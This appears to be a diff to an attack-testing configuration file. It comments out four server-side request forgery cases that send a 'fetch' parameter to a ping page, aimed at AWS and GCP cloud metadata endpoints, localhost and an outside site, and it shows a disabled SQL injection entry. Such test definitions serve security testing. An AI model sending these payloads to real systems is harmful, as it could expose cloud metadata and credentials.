@@ -91,46 +91,46 @@ attacks:
     successIndicators:
       - bodyContains: "processor"
 
-  # --- SSRF (via helper.php) ---
-  - name: ssrf-aws-metadata
-    type: ssrf
-    http:
-      method: GET
-      path: /ping.php
-      queryParams:
-        fetch: "http://169.254.169.254/latest/meta-data/"
-    successIndicators:
-      - bodyContains: "instance-id"
+  # # --- SSRF (via helper.php) ---
+  # - name: ssrf-aws-metadata
+  #   type: ssrf
+  #   http:
+  #     method: GET
+  #     path: /ping.php
+  #     queryParams:
+  #       fetch: "http://169.254.169.254/latest/meta-data/"
+  #   successIndicators:
+  #     - bodyContains: "instance-id"
 
-  - name: ssrf-gcp-metadata
-    type: ssrf
-    http:
-      method: GET
-      path: /ping.php
-      queryParams:
-        fetch: "http://metadata.google.internal/computeMetadata/v1/"
-    successIndicators:
-      - bodyContains: "project"
+  # - name: ssrf-gcp-metadata
+  #   type: ssrf
+  #   http:
+  #     method: GET
+  #     path: /ping.php
+  #     queryParams:
+  #       fetch: "http://metadata.google.internal/computeMetadata/v1/"
+  #   successIndicators:
+  #     - bodyContains: "project"
 
-  - name: ssrf-localhost
-    type: ssrf
-    http:
-      method: GET
-      path: /ping.php
-      queryParams:
-        fetch: "http://127.0.0.1:80"
-    successIndicators:
-      - statusCode: 200
+  # - name: ssrf-localhost
+  #   type: ssrf
+  #   http:
+  #     method: GET
+  #     path: /ping.php
+  #     queryParams:
+  #       fetch: "http://127.0.0.1:80"
+  #   successIndicators:
+  #     - statusCode: 200
 
-  - name: ssrf-google
-    type: ssrf
-    http:
-      method: GET
-      path: /ping.php
-      queryParams:
-        fetch: "http://google.com"
-    successIndicators:
-      - bodyContains: "google"
+  # - name: ssrf-google
+  #   type: ssrf
+  #   http:
+  #     method: GET
+  #     path: /ping.php
+  #     queryParams:
+  #       fetch: "http://google.com"
+  #   successIndicators:
+  #     - bodyContains: "google"
 
   # # --- SQL Injection (via login form POST) ---
   # - name: sqli-auth-bypass
